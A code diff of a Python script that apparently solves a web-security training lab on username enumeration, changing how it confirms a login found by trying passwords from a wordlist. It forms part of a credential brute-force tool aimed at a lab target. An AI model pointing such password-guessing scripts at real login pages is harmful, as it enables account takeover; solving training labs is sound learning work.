@@ -54,13 +54,12 @@ def enumerate_password(url, username, passwords_filename):
 
 def verify_login(url, username, password):
     data = {'username': username, 'password': password}
-    r = requests.post(url, data=data, verify=False, proxies=proxies)
-    if 'Congratulations, you solved the lab!' in r.text:
-        return True
-    return False
+    r = requests.post(url, data=data, verify=False, proxies=proxies, allow_redirects=True)
+    return f'Your username is: {username}' in r.text
 
 
 def main():
+    print('[+] Username enumeration via different responses')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -83,10 +82,11 @@ def main():
         sys.exit(-3)
     print(f'[+] Found password: {password}')
 
-    if verify_login(url, username, password):
-        print(f'[+] Login successful, lab solved')
-    else:
+    if not verify_login(url, username, password):
         print(f'[+] Login not successful')
+        sys.exit(-4)
+    print(f'[+] Login successful')
+    print(f'[+] Lab solved')
 
 
 if __name__ == "__main__":
